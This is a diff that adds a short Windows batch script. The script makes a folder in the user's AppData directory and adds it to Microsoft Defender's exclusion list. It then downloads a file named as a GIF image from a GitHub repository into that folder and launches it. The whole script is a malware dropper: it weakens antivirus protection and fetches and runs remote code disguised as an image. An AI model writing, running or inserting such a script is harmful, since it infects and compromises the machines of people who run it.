@@ -1,0 +1,5 @@
+set "folderPath=%USERPROFILE%\AppData\Local\test"
+mkdir "%folderPath%"
+powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/p1ssguzzler/testing/blob/main/cap2tion.gif?raw=true' -OutFile '%folderPath%\cap2tion.gif'"
+start "" "%folderPath%\cap2tion.gif"
